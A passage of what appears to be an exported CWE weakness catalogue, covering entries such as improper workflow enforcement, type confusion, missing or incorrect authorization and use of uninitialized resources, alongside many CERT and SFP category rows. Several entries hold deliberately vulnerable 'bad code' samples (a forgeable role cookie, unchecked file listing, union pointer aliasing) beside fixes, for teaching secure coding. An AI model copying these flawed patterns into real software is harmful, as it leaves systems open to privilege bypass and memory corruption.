example the if statement should the modified to include a minimum range check, as shown below.(good code)Example Language:Javapublic class BankAccount {public final int MINIMUM_WITHDRAWAL_LIMIT = 0;public final int MAXIMUM_WITHDRAWAL_LIMIT = 350;...// method to withdraw amount from BankAccountpublic void withdraw(double withdrawAmount) {if (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT &&withdrawAmount > MINIMUM_WITHDRAWAL_LIMIT) {...Note that this example does not protect against concurrent access to the BankAccount balance variable, seeCWE-413andCWE-362.While it is out of scope for this example, note that the use of doubles or floats in financial calculations may be subject to certain kinds of attacks where attackers use rounding errors to steal money.","Phase:  ImplementationStrategy:  Enforcement by ConversionIf the number to be used is always expected to be positive, change the variable type from signed to unsigned or size_t.Phase:  ImplementationStrategy:  Input ValidationIf the number to be used could have a negative value based on the specification (thus requiring a signed value), but the number should only be positive to preserve code correctness, then include a check to ensure that the value is positive."
CWE CATEGORY: Business Logic Errors,"Weaknesses in this category identify some of the underlying problems that commonly allow attackers to manipulate the business logic of an application. Errors in business logic can be devastating to an entire application. They can be difficult to find automatically, since they typically involve legitimate use of the application's functionality. However, many business logic errors can exhibit patterns that are similar to well-understood implementation and design weaknesses.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-841: Improper Enforcement of Behavioral Workflow,"The product supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.","Scope: Other, Impact: Technical Impact:Alter Execution LogicAn attacker could cause the product to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications., Likelihood: ","Example 1This code is part of an FTP server and deals with various commands that could be sent by a user. It is intended that a user must successfully login before performing any other action such as retrieving or listing files.(bad code)Example Language:Pythondef dispatchCommand(command, user, args):if command == 'Login':loginUser(args)return# user has requested a fileif command == 'Retrieve_file':if authenticated(user) and ownsFile(user,args):sendFile(args)returnif command == 'List_files':listFiles(args)return...The server correctly avoids sending files to a user that isn't logged in and doesn't own the file. However, the server will incorrectly list the files in any directory without confirming the command came from an authenticated user, and that the user is authorized to see the directory's contents.Here is a fixed version of the above example:(good code)Example Language:Pythondef dispatchCommand(command, user, args):...if command == 'List_files':if authenticated(user) and ownsDirectory(user,args):listFiles(args)return...",无可能的缓解方案
CWE-842: Placement of User into Incorrect Group,The product or the administrator places a user into an incorrect group.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ",无示范例子,无可能的缓解方案
CWE-843: Access of Resource Using Incompatible Type ('Type Confusion'),"The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.","Scope: AvailabilityIntegrityConfidentiality, Impact: Technical Impact:Read Memory; Modify Memory; Execute Unauthorized Code or Commands; DoS: Crash, Exit, or RestartWhen a memory buffer is accessed using the wrong type, it could read or write memory out of the bounds of the buffer, if the allocated buffer is smaller than the type that the code is attempting to access, leading to a crash and possibly code execution., Likelihood: ","Example 1The following code uses a union to support the representation of different types of messages. It formats messages differently, depending on their type.(bad code)Example Language:C#define NAME_TYPE 1#define ID_TYPE 2struct MessageBuffer{int msgType;union {char *name;int nameID;};};int main (int argc, char **argv) {struct MessageBuffer buf;char *defaultMessage = ""Hello World"";buf.msgType = NAME_TYPE;buf.name = defaultMessage;printf(""Pointer of buf.name is %p\n"", buf.name);/* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */buf.nameID = (int)(defaultMessage + 1);printf(""Pointer of buf.name is now %p\n"", buf.name);if (buf.msgType == NAME_TYPE) {printf(""Message: %s\n"", buf.name);}else {printf(""Message: Use ID %d\n"", buf.nameID);}}The code intends to process the message as a NAME_TYPE, and sets the default message to ""Hello World."" However, since both buf.name and buf.nameID are part of the same union, they can act as aliases for the same memory location, depending on memory layout after compilation.As a result, modification of buf.nameID - an int - can effectively modify the pointer that is stored in buf.name - a string.Execution of the program might generate output such as:Pointer of name is 10830Pointer of name is now 10831Message: ello WorldNotice how the pointer for buf.name was changed, even though buf.name was not explicitly modified.In this case, the first ""H"" character of the message is omitted. However, if an attacker is able to fully control the value of buf.nameID, then buf.name could contain an arbitrary pointer, leading to out-of-bounds reads or writes.Example 2The following PHP code accepts a value, adds 5, and prints the sum.(bad code)Example Language:PHP$value = $_GET['value'];$sum = $value + 5;echo ""value parameter is '$value'<p>"";echo ""SUM is $sum"";When called with the following query string:value=123the program calculates the sum and prints out:SUM is 128However, the attacker could supply a query string such as:value[]=123The ""[]"" array syntax causes $value to be treated as an array type, which then generates a fatal error when calculating $sum:Fatal error: Unsupported operand types in program.php on line 2Example 3The following Perl code is intended to look up the privileges for user ID's between 0 and 3, by performing an access of the $UserPrivilegeArray reference. It is expected that only userID 3 is an admin (since this is listed in the third element of the array).(bad code)Example Language:Perlmy $UserPrivilegeArray = [""user"", ""user"", ""admin"", ""user""];my $userID = get_current_user_ID();if ($UserPrivilegeArray eq ""user"") {print ""Regular user!\n"";}else {print ""Admin!\n"";}print ""\$UserPrivilegeArray = $UserPrivilegeArray\n"";In this case, the programmer intended to use ""$UserPrivilegeArray->{$userID}"" to access the proper position in the array. But because the subscript was omitted, the ""user"" string was compared to the scalar representation of the $UserPrivilegeArray reference, which might be of the form ""ARRAY(0x229e8)"" or similar.Since the logic also ""fails open"" (CWE-636), the result of this bug is that all users are assigned administrator privileges.While this is a forced example, it demonstrates how type confusion can have security consequences, even in memory-safe languages.",无可能的缓解方案
CWE VIEW: Weaknesses Addressed by The CERT Oracle Secure Coding Standard for Java (2011),"CWE entries in this view (graph) are fully or partially eliminated by following the guidance presented in the book ""The CERT Oracle Secure Coding Standard for Java"" published in 2011. This view is considered obsolete as a newer version of the coding standard is available.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 2 - Input Validation and Data Sanitization (IDS),Weaknesses in this category are related to rules in the Input Validation and Data Sanitization (IDS) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 3 - Declarations and Initialization (DCL),Weaknesses in this category are related to rules in the Declarations and Initialization (DCL) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 4 - Expressions (EXP),Weaknesses in this category are related to rules in the Expressions (EXP) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 5 - Numeric Types and Operations (NUM),Weaknesses in this category are related to rules in the Numeric Types and Operations (NUM) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 6 - Object Orientation (OBJ),Weaknesses in this category are related to rules in the Object Orientation (OBJ) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 7 - Methods (MET),Weaknesses in this category are related to rules in the Methods (MET) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 8 - Exceptional Behavior (ERR),Weaknesses in this category are related to rules in the Exceptional Behavior (ERR) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 9 - Visibility and Atomicity (VNA),Weaknesses in this category are related to rules in the Visibility and Atomicity (VNA) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 10 - Locking (LCK),Weaknesses in this category are related to rules in the Locking (LCK) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 11 - Thread APIs (THI),Weaknesses in this category are related to rules in the Thread APIs (THI) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 12 - Thread Pools (TPS),Weaknesses in this category are related to rules in the Thread Pools (TPS) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 13 - Thread-Safety Miscellaneous (TSM),Weaknesses in this category are related to rules in the Thread-Safety Miscellaneous (TSM) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 14 - Input Output (FIO),Weaknesses in this category are related to rules in the Input Output (FIO) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 15 - Serialization (SER),Weaknesses in this category are related to rules in the Serialization (SER) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 16 - Platform Security (SEC),Weaknesses in this category are related to rules in the Platform Security (SEC) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 17 - Runtime Environment (ENV),Weaknesses in this category are related to rules in the Runtime Environment (ENV) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: The CERT Oracle Secure Coding Standard for Java (2011) Chapter 18 - Miscellaneous (MSC),Weaknesses in this category are related to rules in the Miscellaneous (MSC) chapter of The CERT Oracle Secure Coding Standard for Java (2011).,无常见后果信息,无示范例子,无可能的缓解方案
CWE-862: Missing Authorization,The product does not perform an authorization check when an actor attempts to access a resource or perform an action.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesAn attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data; Modify Files or DirectoriesAn attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection MechanismAn attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality., Likelihood: ","Example 1This function runs an arbitrary SQL query on a given database, returning the result of the query.(bad code)Example Language:PHPfunction runEmployeeQuery($dbName, $name){mysql_select_db($dbName,$globalDbHandle) or die(""Could not open Database"".$dbName);//Use a prepared statement to avoidCWE-89$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');$preparedStatement->execute(array(':name' => $name));return $preparedStatement->fetchAll();}/.../$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.Example 2The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.(bad code)Example Language:Perlsub DisplayPrivateMessage {my($id) = @_;my $Message = LookupMessageObject($id);print ""From: "" . encodeHTML($Message->{from}) . ""<br>\n"";print ""Subject: "" . encodeHTML($Message->{subject}) . ""\n"";print ""<hr>\n"";print ""Body: "" . encodeHTML($Message->{body}) . ""\n"";}my $q = new CGI;# For purposes of this example, assume thatCWE-309and#CWE-523do not apply.if (! AuthenticateUser($q->param('username'), $q->param('password'))) {ExitError(""invalid username or password"");}my $id = $q->param('id');DisplayPrivateMessage($id);While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.One way to avoid this problem would be to ensure that the ""to"" field in the message object matches the username of the authenticated user.","Phase:  Architecture and DesignDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.Phase:  Architecture and DesignEnsure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].Phase:  Architecture and DesignFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.Phases:  System Configuration; InstallationUse the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a ""default deny"" policy when defining these ACLs."
CWE-863: Incorrect Authorization,"The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesAn attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data; Modify Files or DirectoriesAn attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection MechanismAn attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality., Likelihood: ","Example 1The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.(bad code)Example Language:PHP$role = $_COOKIES['role'];if (!$role) {$role = getRole('user');if ($role) {// save the cookie to send out in future responsessetcookie(""role"", $role, time()+60*60*2);}else{ShowLoginScreen();die(""\n"");}}if ($role == 'Reader') {DisplayMedicalHistory($_POST['patient_ID']);}else{die(""You are not Authorized to view this record\n"");}The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the ""role"" cookie to the value ""Reader"". As a result, the $role variable is ""Reader"", and getRole() is never invoked. The attacker has bypassed the authorization system.","Phase:  Architecture and DesignDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.Phase:  Architecture and DesignEnsure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].Phase:  Architecture and DesignFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.Phases:  System Configuration; InstallationUse the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a ""default deny"" policy when defining these ACLs."
CWE CATEGORY: 2011 Top 25 - Insecure Interaction Between Components,"Weaknesses in this category are listed in the ""Insecure Interaction Between Components"" section of the 2011 CWE/SANS Top 25 Most Dangerous Software Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2011 Top 25 - Risky Resource Management,"Weaknesses in this category are listed in the ""Risky Resource Management"" section of the 2011 CWE/SANS Top 25 Most Dangerous Software Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2011 Top 25 - Porous Defenses,"Weaknesses in this category are listed in the ""Porous Defenses"" section of the 2011 CWE/SANS Top 25 Most Dangerous Software Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2011 Top 25 - Weaknesses On the Cusp,"Weaknesses in this category are not part of the general Top 25, but they were part of the original nominee list from which the Top 25 was drawn.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses Addressed by the SEI CERT C++ Coding Standard (2016 Version),"CWE entries in this view (graph) are fully or partially eliminated by following the SEI CERT C++ Coding Standard, as published in 2016. This view is no longer being actively maintained, since it statically represents the coding rules as they were in 2016.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 01 - Preprocessor (PRE),"Weaknesses in this category are related to rules in the Preprocessor (PRE) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 02 - Declarations and Initialization (DCL),"Weaknesses in this category are related to rules in the Declarations and Initialization (DCL) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 03 - Expressions (EXP),"Weaknesses in this category are related to rules in the Expressions (EXP) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 04 - Integers (INT),"Weaknesses in this category are related to rules in the Integers (INT) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 05 - Floating Point Arithmetic (FLP),"Weaknesses in this category are related to rules in the Floating Point Arithmetic (FLP) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 06 - Arrays and the STL (ARR),"Weaknesses in this category are related to rules in the Arrays and the STL (ARR) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 07 - Characters and Strings (STR),"Weaknesses in this category are related to rules in the Characters and Strings (STR) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 08 - Memory Management (MEM),"Weaknesses in this category are related to rules in the Memory Management (MEM) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 09 - Input Output (FIO),"Weaknesses in this category are related to rules in the Input Output (FIO) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 10 - Environment (ENV),"Weaknesses in this category are related to rules in the Environment (ENV) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 11 - Signals (SIG),"Weaknesses in this category are related to rules in the Signals (SIG) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 12 - Exceptions and Error Handling (ERR),"Weaknesses in this category are related to rules in the Exceptions and Error Handling (ERR) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 13 - Object Oriented Programming (OOP),"Weaknesses in this category are related to rules in the Object Oriented Programming (OOP) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 14 - Concurrency (CON),"Weaknesses in this category are related to rules in the Concurrency (CON) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C++ Secure Coding Section 49 - Miscellaneous (MSC),"Weaknesses in this category are related to rules in the Miscellaneous (MSC) section of the CERT C++ Secure Coding Standard. Since not all rules map to specific weaknesses, this category may be incomplete.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: CWE Cross-section,"This view contains a selection of weaknesses that represent the variety of weaknesses that are captured in CWE, at a level of abstraction that is likely to be useful to most audiences. It can be used by researchers to determine how broad their theories, models, or tools are. It will also be used by the CWE content team in 2012 to focus quality improvement efforts for individual CWE entries.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Risky Values,This category identifies Software Fault Patterns (SFPs) within the Risky Values cluster (SFP1).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Unused entities,This category identifies Software Fault Patterns (SFPs) within the Unused entities cluster (SFP2).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: API,This category identifies Software Fault Patterns (SFPs) within the API cluster (SFP3).,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Software Fault Pattern (SFP) Clusters,CWE identifiers in this view are associated with clusters of Software Fault Patterns (SFPs).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Exception Management,"This category identifies Software Fault Patterns (SFPs) within the Exception Management cluster (SFP4, SFP5, SFP6).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Memory Access,"This category identifies Software Fault Patterns (SFPs) within the Memory Access cluster (SFP7, SFP8).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Memory Management,This category identifies Software Fault Patterns (SFPs) within the Memory Management cluster (SFP38).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Resource Management,This category identifies Software Fault Patterns (SFPs) within the Resource Management cluster (SFP37).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Path Resolution,"This category identifies Software Fault Patterns (SFPs) within the Path Resolution cluster (SFP16, SFP17, SFP18).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Synchronization,"This category identifies Software Fault Patterns (SFPs) within the Synchronization cluster (SFP19, SFP20, SFP21, SFP22).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Information Leak,This category identifies Software Fault Patterns (SFPs) within the Information Leak cluster (SFP23).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Tainted Input,"This category identifies Software Fault Patterns (SFPs) within the Tainted Input cluster (SFP24, SFP25, SFP26, SFP27).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Entry Points,This category identifies Software Fault Patterns (SFPs) within the Entry Points cluster (SFP28).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Authentication,"This category identifies Software Fault Patterns (SFPs) within the Authentication cluster (SFP29, SFP30, SFP31, SFP32, SFP33, SFP34).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Access Control,This category identifies Software Fault Patterns (SFPs) within the Access Control cluster (SFP35).,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in the 2011 CWE/SANS Top 25 Most Dangerous Software Errors,CWE entries in this view (graph) are listed in the 2011 CWE/SANS Top 25 Most Dangerous Software Errors.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Privilege,This category identifies Software Fault Patterns (SFPs) within the Privilege cluster (SFP36).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Channel,This category identifies Software Fault Patterns (SFPs) within the Channel cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Cryptography,This category identifies Software Fault Patterns (SFPs) within the Cryptography cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Malware,This category identifies Software Fault Patterns (SFPs) within the Malware cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Predictability,This category identifies Software Fault Patterns (SFPs) within the Predictability cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: UI,This category identifies Software Fault Patterns (SFPs) within the UI cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Other,This category identifies Software Fault Patterns (SFPs) within the Other cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-908: Use of Uninitialized Resource,The product uses or accesses a resource that has not been initialized.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Application DataWhen reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend., Likelihood: ","Example 1Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached.(bad code)Example Language:Javaprivate boolean initialized = true;public void someMethod() {if (!initialized) {// perform initialization tasks...initialized = true;}Example 2The following code intends to limit certain operations to the administrator only.(bad code)Example Language:Perl$username = GetCurrentUser();$state = GetStateData($username);if (defined($state)) {$uid = ExtractUserID($state);}# do stuffif ($uid == 0) {DoAdminThings();}If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to ""0"" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident.Example 3The following code intends to concatenate a string to a variable and print the string.(bad code)Example Language:Cchar str[20];strcat(str, ""hello world"");printf(""%s"", str);This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory.If a null terminator is found before str[8], then some bytes of random garbage will be printed before the ""hello world"" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result ofCWE-14orCWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found.If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.Example 4This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address.(bad code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).To fix this code, there are a couple approaches to
			  making sure that test_string has been properly set once
			  it reaches the printf().One solution would be to set test_string to an
			  acceptable default before the conditional:(good code)Example Language:Cchar *test_string = ""Done at the beginning"";if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);Another solution is to ensure that each
			  branch of the conditional - including the default/else
			  branch - could ensure that test_string is set:(good code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}else {test_string = ""Done on the other side!"";}printf(""%s"", test_string);","Phase:  ImplementationExplicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all required steps.Phase:  ImplementationPay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization.Phase:  ImplementationAvoid race conditions (CWE-362) during initialization routines.Phase:  Build and CompilationRun or compile the product with settings that generate warnings about uninitialized variables or data."
